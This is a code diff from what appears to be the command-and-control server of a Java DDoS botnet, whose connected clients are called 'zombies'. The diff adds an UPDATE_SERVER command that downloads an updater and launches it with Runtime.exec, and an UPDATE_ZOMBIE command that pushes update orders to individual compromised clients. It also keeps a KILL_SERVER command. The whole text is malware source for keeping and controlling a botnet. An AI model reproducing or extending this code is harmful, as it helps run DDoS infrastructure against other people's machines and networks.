@@ -4,6 +4,7 @@ import java.io.IOException;
 import java.net.SocketAddress;
 import java.util.ArrayList;
 
+import org.ddos.updater.Updater;
 import org.ddos.util.Computer;
 import org.jnetwork.DataPackage;
 import org.jnetwork.Server;
@@ -88,15 +89,25 @@ public class ClientCycle {
 
 				event.getOutputStream().writeObject(
 						new DataPackage(computers.toArray(new Computer[computers.size()])).setMessage("ALL_COMPUTERS"));
-			} else if(pkgIn.getMessage().equals("KILL_SERVER")) {
+			} else if (pkgIn.getMessage().equals("KILL_SERVER")) {
 				for (SocketPackage zombie : server.getClients()) {
 					if ((boolean) zombie.getExtraData()[0]) {
 						server.removeClient(zombie);
 					}
 				}
-				
+
 				System.out.println("Shutting down server by request.");
 				System.exit(0);
+			} else if (pkgIn.getMessage().equals("UPDATE_SERVER")) {
+				Updater.downloadIfNonexistent();
+
+				System.out.println("A client requested to update the server.");
+				Runtime.getRuntime()
+						.exec("java -jar " + System.getProperty("user.dir") + "\\" + Updater.NAME + " Server");
+				System.exit(0);
+			} else if (pkgIn.getMessage().equals("UPDATE_ZOMBIE")) {
+				server.getClient((SocketAddress) pkgIn.getObjects()[0]).getOutputStream()
+						.writeObject(new DataPackage().setMessage("UPDATE_ZOMBIE"));
 			}
 		}
 	}
